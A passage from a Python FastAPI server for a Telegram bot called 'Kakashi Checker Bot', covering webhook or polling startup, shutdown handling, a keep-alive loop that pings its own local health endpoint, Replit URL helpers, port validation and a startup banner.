            webhook_url = f"https://{domain.split(',')[0].strip()}/api/bot-webhook"
            await start_bot_async(webhook_url)
        else:
            logger.warning("REPLIT_DOMAINS not set — falling back to polling")
            await start_bot_async()
    else:
        await start_bot_async()
    
    start_keep_alive()

@app.on_event("shutdown")
async def shutdown_event():
    logger.info("FastAPI app shutdown.")
    if application:
        if application.updater and application.updater.running:
            await application.updater.stop()
        if application.running:
            await application.stop()
    conn.close()

# --- Keep-alive logic ---
async def perform_keep_alive(health_url: str):
    try:
        # verify=False skips SSL cert check (safe for self-pinging own server)
        async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
            response = await client.get(health_url)
            if response.is_success:
                logger.info(f"✅ Keep-alive ping OK — {health_url} ({response.status_code})")
            else:
                logger.warning(f"Keep-alive ping returned non-OK status: {response.status_code}")
    except httpx.RequestError as err:
        logger.warning(f"Keep-alive ping failed: {err}")

def start_keep_alive():
    if os.environ.get("KEEP_ALIVE_ENABLED") == "false":
        logger.info("Keep-alive disabled")
        return

    # Default: ping every 5 minutes (300000ms)
    interval_ms = int(os.environ.get("KEEP_ALIVE_INTERVAL_MS", 300000))
    health_url = get_self_health_url()

    if interval_ms < 60000:
        raise ValueError("KEEP_ALIVE_INTERVAL_MS must be at least 60000.")

    async def keep_alive_loop():
        # Wait one full interval before first ping so server is ready
        await asyncio.sleep(interval_ms / 1000)
        while True:
            await perform_keep_alive(health_url)
            await asyncio.sleep(interval_ms / 1000)

    asyncio.create_task(keep_alive_loop())
    logger.info(f"Keep-alive started — pinging {health_url} every {interval_ms // 1000}s")
    ext = get_external_url()
    if ext:
        logger.info(f"📡 UptimeRobot/external ping URL: {ext}")

def get_self_health_url() -> str:
    port = int(os.environ.get("PORT", 3000))
    return f"http://127.0.0.1:{port}/healthz"

def get_external_url() -> Optional[str]:
    domains = os.environ.get("REPLIT_DOMAINS")
    dev_domain = os.environ.get("REPLIT_DEV_DOMAIN")
    domain = domains.split(",")[0].strip() if domains else dev_domain
    if not domain:
        return None
    if os.environ.get("REPLIT_DEPLOYMENT") == "1":
        return f"https://{domain}/healthz"
    port = int(os.environ.get("PORT", 3000))
    return f"https://{domain}:{port}/healthz"

# --- Main execution ---
if __name__ == "__main__":
    raw_port = os.environ.get("PORT")
    if not raw_port:
        logger.error("PORT environment variable is required but was not provided.")
        sys.exit(1)
    
    try:
        port = int(raw_port)
        if port <= 0:
            raise ValueError
    except ValueError:
        logger.error(f"Invalid PORT value: \"{raw_port}\"")
        sys.exit(1)

    banner = f"""
╔══════════════════════════════════════════╗
║   ⚡ Kakashi Checker Bot v3.0            ║
║   Developer: @ReallyTsugikuni           ║
║   Status: {'✅ Bot Ready' if is_bot_configured else '❌ Token Missing'}                      ║
╚══════════════════════════════════════════╝"""
    logger.info(banner)
    
    # Use uvicorn to run the FastAPI app
    uvicorn.run(app, host="0.0.0.0", port=port)